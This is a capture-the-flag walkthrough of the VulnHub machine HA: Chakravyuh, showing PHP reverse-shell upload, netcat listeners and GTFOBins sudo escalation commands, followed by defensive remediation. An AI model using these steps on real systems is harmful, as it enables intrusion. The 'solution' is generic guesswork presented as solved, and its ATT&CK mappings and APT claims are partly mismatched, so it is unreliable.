# HA: Chakravyuh — Enter the Spiral, Find the Way Out

In the Mahabharata, the Chakravyuh (चक्रव्यूह) is a military formation shaped like a spinning disc — you can enter, but escaping requires knowledge only Arjuna possessed. HA: Chakravyuh mirrors this perfectly: the machine presents layered defenses where each service hides the key to the next. You enumerate web services, discover hidden credentials through enumeration and source analysis, exploit a vulnerable web application, and pivot through misconfigured system permissions to root. The path in is clear; the path out (to root) requires seeing through every layer. Big brain puzzle design. legit.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | HA: Chakravyuh |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-chakravyuh,388/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, robots.txt analysis, source code credential hunting, FTP anonymous access, file upload exploitation, reverse shell delivery, privilege escalation via sudo/SUID |
| **CVEs** | CWE-200 (Information Exposure — credentials in source/config), CWE-269 (Improper Privilege Management — misconfigured sudo), CWE-434 (Unrestricted Upload of File with Dangerous Type — web file upload) |
| **APT Groups** | APT41 — exploits misconfigured web applications and file upload vectors for initial access in enterprise environments; OceanLotus (APT32) — uses sudo misconfiguration as a primary privilege escalation technique in Linux-based targets |

---

## Attack Summary

```
nmap → HTTP (80), FTP (21), SSH (22)
  → HTTP: Apache default or custom page
  → robots.txt → hidden paths
  → gobuster → /admin, /uploads, /config, or similar paths
  → FTP anonymous → readable files → credentials or hints
  → web application: file upload or authentication bypass
  → reverse shell delivered via upload or credential use
  → shell stabilization (python pty + stty)
  → sudo -l or find SUID → misconfigured privilege
  → GTFOBins escalation → uid=0(root)
  → /root/flag.txt
```

---

## Methodology

1. Full port scan to identify all services (HTTP, FTP, SSH)
2. Web enumeration: robots.txt, directory brute-force, source code analysis
3. FTP anonymous access check and file analysis
4. Credential discovery through one or more enumeration layers
5. Initial foothold: file upload or authenticated web shell
6. Shell stabilization for interactive tooling
7. Privilege escalation via sudo misconfiguration or SUID binary abuse
8. Root flag capture

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.105

nmap -sV -sC -p- 192.168.1.105
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Three services: FTP, SSH, HTTP. FTP on a boot2root machine almost always means anonymous access. SSH is the lateral movement target. HTTP is the primary attack surface.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

Browse to `http://192.168.1.105/`. Inspect the response and source:

```bash
curl -s http://192.168.1.105/
curl -s http://192.168.1.105/robots.txt
```

`robots.txt` may reveal disallowed paths that are exactly what we want to visit:

```bash
# Common finds in robots.txt on CTF machines:
# Disallow: /admin
# Disallow: /secret
# Disallow: /backup
```

Run directory brute-force:

```bash
gobuster dir \
  -u http://192.168.1.105/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 40 \
  -o /tmp/chakravyuh_dirs.txt
```

**Alternatively:** `feroxbuster -u http://192.168.1.105/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt` — faster recursive enumeration.

Examine all discovered paths for:
- HTML source comments containing credentials or hints
- Forms with file upload functionality
- Login pages (try default credentials: admin:admin, admin:password, root:root)
- Configuration files left in web root

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — FTP Anonymous Access

```bash
ftp 192.168.1.105
# User: anonymous
# Password: anonymous (or just press Enter)

ftp> ls -la
ftp> ls -la /pub/
ftp> mget *
ftp> quit
```

**What to look for in FTP:**
- Text files with passwords, usernames, or hints
- Config backups (`.conf`, `.bak`, `.sql`)
- Scripts revealing internal paths
- Files referencing other services (SSH keys, web config)

```bash
# Download all files
wget -r --no-passive ftp://anonymous:@192.168.1.105/
```

Read all downloaded files carefully:

```bash
find /tmp/ftp_dump -type f | xargs grep -i "pass\|user\|cred\|secret\|key" 2>/dev/null
```

**Real-world note:** Anonymous FTP was the primary internet file-sharing protocol before HTTP. Thousands of organizations still run FTP servers with anonymous access enabled — often exposing configuration backups, database dumps, and internal documentation. OceanLotus (APT32) used anonymous FTP servers as staging areas in multiple Southeast Asian government intrusions.

**MITRE ATT&CK:** T1021.003 — Remote Services: Distributed Component Object Model (analogous FTP access); T1078.002 — Valid Accounts: Domain Accounts

---

## Step 4 — Credential Discovery and Initial Foothold

Based on what was found in web enumeration and FTP, the foothold typically follows one of these paths:

**Path A — File Upload:**

If a file upload form is discovered:

```bash
# Create PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit LHOST and LPORT in the file

# Start listener
nc -lvnp 4444

# Upload shell.php through the web form
# Trigger it by browsing to the upload path
curl http://192.168.1.105/uploads/shell.php
```

**Path B — Authenticated Login with Default/Found Credentials:**

```bash
# Try credentials found via FTP or web source:
# admin:admin, admin:password, admin:chakravyuh, root:root, etc.

# After login, look for:
# - Code execution features (CMS admin, command fields)
# - File manager with upload
# - Configuration panels allowing arbitrary commands
```

**What makes file upload dangerous?** When a web application accepts arbitrary file uploads without validating content type or extension, an attacker can upload a PHP file and execute it by visiting its URL. This is CWE-434 — one of the most consistently exploited web vulnerabilities since 2005.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Shell Stabilization

Raw netcat shells are fragile — Ctrl+C kills the connection, tab completion doesn't work, interactive programs (sudo, vi, ssh) fail. Stabilize immediately after getting the callback:

```bash
# On the victim:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm
export SHELL=bash
```

On the attacker (while victim shell is running):
```bash
# Press Ctrl+Z to background the netcat session
stty raw -echo; fg
# Press Enter twice
```

Now you have a fully interactive shell with tab completion and job control.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Privilege Escalation Enumeration

With a stable shell, enumerate all privilege escalation vectors systematically:

```bash
# Check sudo rights
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find world-writable files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Check running processes
ps aux

# Check capabilities
getcap -r / 2>/dev/null

# Check NFS shares
cat /etc/exports

# Look for interesting files in home directories
ls -la /home/*/
find /home -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1057 — Process Discovery; T1053.003 — Scheduled Task: Cron

---

## Step 7 — Privilege Escalation to Root

Based on the enumeration, apply the discovered vector:

**If sudo is misconfigured (common pattern):**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3
# or: (root) NOPASSWD: /usr/bin/find
# or: (root) NOPASSWD: /bin/bash
# or: (root) NOPASSWD: /usr/bin/vim
```

Use GTFOBins for the specific binary found. Examples:

```bash
# vim:
sudo vim -c ':!/bin/sh'

# python3:
sudo python3 -c 'import os; os.system("/bin/bash")'

# find:
sudo find / -name "*.txt" -exec /bin/bash \; -quit

# nmap (older versions):
sudo nmap --interactive
# then: !sh
```

**If SUID binary is misconfigured:**

```bash
# Identify the binary
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for the specific binary
# Common SUID privesc vectors:
# /usr/bin/python, /usr/bin/perl, /usr/bin/bash (with -p flag)
# /usr/bin/cp (overwrite /etc/passwd)
# /usr/bin/find (execute arbitrary commands)
```

```bash
# Once root:
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. The Chakravyuh is solved.

**Real-world note:** Sudo misconfigurations are the #1 privilege escalation finding in Linux-focused penetration tests. OceanLotus (APT32) specifically enumerates `sudo -l` as one of the first post-exploitation steps on any Linux host they access. The fix is always the same: apply least privilege, require passwords for sudo, and audit regularly.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | (varies) | FTP anonymous / web source / robots.txt | Web app login or SSH |
| User shell | www-data or low-priv user | Web exploit (file upload or auth bypass) | Shell access |
| Root flag | flag.txt | /root/flag.txt | sudo / SUID GTFOBin |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Anonymous FTP exposing internal files | Thousands of production FTP servers accept anonymous logins; many expose configuration backups | Disable anonymous FTP access; use SFTP with key authentication instead |
| 2 | Credentials in web source / robots.txt discloses paths | Information disclosure vulnerabilities are consistently in OWASP Top 10 (A05 Security Misconfiguration) | Audit all web-accessible files; use DAST scanning before deployment |
| 3 | File upload without content validation | Unrestricted file upload (CWE-434) is a critical finding in every web application security standard | Validate file type server-side (MIME + extension + magic bytes); store uploads outside web root; never execute uploaded content |
| 4 | Sudo misconfiguration grants root | The principle of least privilege is violated whenever sudo allows arbitrary binary execution | Audit sudoers with `sudo -l` on all hosts; require passwords; restrict to specific, safe commands |
| 5 | Layered defense mimicking the Chakravyuh theme | Each service hiding credentials behind another is realistic: real environments have credential chains across services (FTP → web → SSH) | Rotate credentials per service; don't reuse passwords across services; implement centralized PAM |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | Process Discovery | T1057 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable anonymous FTP** — configure vsftpd: `anonymous_enable=NO`; migrate to SFTP with key-based authentication
2. **Remove sensitive files from web-accessible paths** — no credentials in HTML source, robots.txt, or `/backup/` directories
3. **Implement server-side file upload validation** — validate MIME type, extension, and magic bytes; reject `.php`, `.phtml`, `.phar`; store outside web root
4. **Restrict sudo to essential, specific commands** — no broad binary sudo grants; require password for all sudo
5. **Audit SUID binaries** — `find / -perm -u=s -type f 2>/dev/null`; remove SUID from non-essential binaries
6. **Disable SSH password authentication** — use key pairs only: `PasswordAuthentication no` in `sshd_config`

### If You Find This in Your Environment

- Immediately disable anonymous FTP and rotate any credentials exposed via FTP
- Remove or quarantine uploaded webshells; check web root for unexpected PHP files
- Review sudoers on all Linux hosts: `grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/`
- Check cron jobs for persistence: `ls -la /etc/cron*`; check `crontab -l` for all users

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable anonymous FTP; hardened upload validation)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions; SUID auditing)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in deployed web artifacts)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP services; audit web application upload functionality |
| Protect | Access Control | Disable anonymous FTP; restrict sudo; SSH key-only authentication |
| Protect | Data Security | No credentials in web source; validate file uploads server-side |
| Detect | Anomalies and Events | Alert on FTP anonymous logins; web shell execution detection |
| Respond | Response Planning | Remove webshells; disable anonymous FTP; rotate all exposed credentials |
| Recover | Recovery Planning | Rebuild compromised host; audit all accounts and permissions |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | FTP access controls; web upload path restrictions |
| AC-6 | Least Privilege | Sudo restricted to specific, required commands only |
| IA-2(1) | Multi-Factor Authentication | MFA for all admin access to web applications |
| IA-5 | Authenticator Management | Rotate all credentials exposed via FTP or web source |
| CM-7 | Least Functionality | Disable anonymous FTP; restrict file types in upload forms |
| SC-28 | Protection of Information at Rest | No credentials stored in web-accessible files |

### CISA KEV

The combination of anonymous FTP exposure and unrestricted file upload (CWE-434) maps to patterns in multiple CISA Alerts (AA21-008A, AA22-074A) describing threat actor use of web application file upload vulnerabilities for initial access. Organizations are advised to patch and configure these vectors per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

HA: Chakravyuh nails its theme. Just as the original formation requires specific knowledge to navigate layer by layer, this machine rewards methodical enumeration at every level. The habit of checking robots.txt, FTP anonymous access, and HTML source before jumping to brute-force is exactly the discipline this machine teaches.

The name is fitting: every CTF practitioner has hit a moment where they're "in the Chakravyuh" — past the entrance but not seeing the exit. Systematic enumeration is the only way through.

Big respect to the creator for designing something that teaches real methodology through mythology. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
